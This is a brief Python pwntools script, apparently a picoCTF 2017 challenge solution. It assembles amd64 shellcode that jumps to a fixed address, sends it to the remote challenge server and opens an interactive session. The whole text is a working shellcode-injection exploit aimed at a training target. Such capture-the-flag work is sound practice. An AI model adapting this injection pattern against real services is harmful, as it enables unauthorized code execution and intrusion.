from pwn import *
import binascii
context(arch='amd64', os='linux')
r = remote('shell2017.picoctf.com', 63545)
r.recv(4096)
shellcode = asm(
    shellcraft.amd64.push(0x08048540) +
    shellcraft.amd64.ret()
)
print binascii.hexlify(shellcode)
r.send(shellcode)
r.interactive()
